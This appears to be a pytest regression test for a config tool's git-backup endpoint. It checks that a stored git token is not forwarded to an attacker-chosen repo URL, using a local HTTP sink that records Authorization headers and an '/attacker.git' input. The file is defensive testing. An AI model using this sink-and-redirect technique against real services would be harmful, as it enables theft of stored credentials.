import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HDR = {'X-CSRF-Token': 'testtoken', 'X-Requested-With': 'fetch'}


class _Sink:
    def __init__(self):
        self.seen = []
        sink = self

        class H(BaseHTTPRequestHandler):
            def do_GET(self):
                auth = self.headers.get('Authorization')
                if auth:
                    sink.seen.append(auth)
                    self.send_response(200)
                    self.end_headers()
                    return
                self.send_response(401)
                self.send_header('WWW-Authenticate', 'Basic realm="git"')
                self.end_headers()

            def log_message(self, *a):
                pass

        self.srv = HTTPServer(('127.0.0.1', 0), H)
        self.url = 'http://127.0.0.1:%d' % self.srv.server_port
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def close(self):
        self.srv.shutdown()


def _configure(client, repo, token='ghp_OPERATOR_SECRET_PAT'):
    import core.settings as sm
    s = sm.load_settings()
    sm.save_settings(
        domains=s['domains'], cert_resolver=s['cert_resolver'],
        traefik_api_url=s['traefik_api_url'], auth_enabled=s['auth_enabled'],
        password_hash=s['password_hash'], visible_tabs=s['visible_tabs'],
        git_backup_repo=repo, git_backup_username='operator', git_backup_token=token)


def test_the_stored_token_is_not_sent_to_another_repo(client):
    sink = _Sink()
    try:
        _configure(client, 'https://github.com/operator/config.git')
        client.post('/api/backup/git/test',
                    json={'repo_url': sink.url + '/attacker.git'}, headers=HDR)
        assert sink.seen == [], \
            'the stored git token was sent to an attacker-chosen host: %r' % sink.seen
    finally:
        sink.close()


def test_the_stored_token_is_still_used_for_the_configured_repo(client):
    sink = _Sink()
    try:
        _configure(client, sink.url + '/config.git')
        client.post('/api/backup/git/test', json={}, headers=HDR)
        assert sink.seen, 'testing the configured repo must still authenticate'
    finally:
        sink.close()


def test_a_caller_supplied_token_still_works_for_a_new_repo(client):
    sink = _Sink()
    try:
        _configure(client, 'https://github.com/operator/config.git')
        client.post('/api/backup/git/test',
                    json={'repo_url': sink.url + '/new.git', 'username': 'someone',
                          'token': 'ghp_JUST_TYPED'}, headers=HDR)
        assert sink.seen, 'a user testing new credentials must still be able to'
    finally:
        sink.close()
